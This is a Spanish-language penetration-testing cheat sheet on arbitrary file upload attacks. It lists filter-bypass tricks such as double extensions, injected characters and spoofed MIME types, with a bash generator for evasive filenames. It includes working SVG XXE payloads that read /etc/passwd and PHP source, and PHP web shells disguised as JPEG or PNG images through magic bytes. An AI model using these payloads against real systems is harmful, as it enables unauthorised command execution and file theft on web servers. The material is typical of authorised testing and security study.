# Arbitrary File Upload

- Este tipo de ataque se basa en intentar subir archivos arbitrarios a una aplicación web.
- Generalmente se consiguen mediante features de una aplicación para subir imagenes o cualquier tipo de archivo.

## Bypassear filtros

### Whitelist filters bypass
- El servidor web solo permite solo ciertos tipos de archivos.

#### Double extensions
- Si el servidor web solo permite archivos con extensiones especificas, se puede intentar subir archivos con extensiones duplicadas.
- [wordlist de extensiones](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
- ejemplo: shell.jpg.php

#### Reverse double extensions
- Es lo mismo que extensiones dobles, pero en este caso se puede intentar subir archivos con extensiones inversas.
- ejemplo: php.jpg
- [wordlist de extensiones dobles php](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

### Character injection
- Se puede intentar subir archivos con caracteres especiales en su nombre.
- `%20`
- `%0a`
-`%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`
    - ejemplo: shell.php%00.jpg

#### Código para generar permutaciones de caracteres en bash
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### MIME type filters bypass
- El servidor web solo permite ciertos tipos de archivos basados en su MIME type.
- [wordlist de content types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
- ejemplo: shell.php con content type image/jpeg
- **GIF8 (GIF) o JFIF (JPEG)** al principio del archivo esto hace que el servidor lo interprete como una imagen.

### SVG + XXE file upload
- Se puede intentar subir un archivo SVG con un XXE payload.

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
- Podemos poner wrappers de p
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### Magic bytes attack
- Se puede intentar subir un archivo con magic bytes que hagan que el servidor lo interprete como un archivo diferente.
- [más info](https://en.wikipedia.org/wiki/List_of_file_signatures)
- [más info x2](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5)
- esto se basa en la firma de los archivos, por ejemplo, un archivo .jpg empieza con (en hexadecimal) `FF D8 FF E0 00 10 4A 46 49 46 00 01`
- podemos hacer lo siguiente:
```
AAAA
<?php echo system($_GET["cmd"]);?>
```
- Lo guardamos como shell.phar.jpeg
- Cambiamos el mymetype utilizando hexeditor, poniendo los numeros magicos reemplazando los valores AAAA: `FF D8 FF DB`
```
- También para PNG se puede hacer lo siguiente:
```bash
#!/bin/sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
```